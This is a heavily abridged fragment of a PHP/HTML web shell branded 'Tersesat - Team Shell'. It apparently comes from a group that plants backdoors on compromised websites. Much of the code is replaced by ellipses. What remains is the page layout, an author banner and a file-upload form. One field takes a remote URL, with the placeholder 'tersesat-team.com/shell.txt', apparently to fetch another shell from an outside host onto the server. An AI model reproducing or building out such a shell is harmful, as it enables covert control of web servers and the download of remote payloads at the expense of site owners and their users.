...
function author() {
    echo "<div class='text-center mt-8 text-gray-400'>TERSESAT-TEAM SHELL</div>";
}
...
<head>
    ...
    <title>Tersesat - Team Shell</title>
...
<body class="bg-gray-900 text-white">
    <div class="container mx-auto px-4 py-8">
        <h1 class="text-4xl font-bold text-center mb-8">Tersesat - Team Shell</h1>     
    ...
    ?>
        ...
        <div class="bg-gray-800 rounded-lg shadow-lg p-6 mb-8">
            ...
            <form enctype="multipart/form-data" method="post" class="space-y-4">
                ...
                <div class="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2">
                    <input type="text" name="darilink" class="flex-grow bg-gray-700 rounded px-3 py-2" placeholder="https://tersesat-team.com/shell.txt">
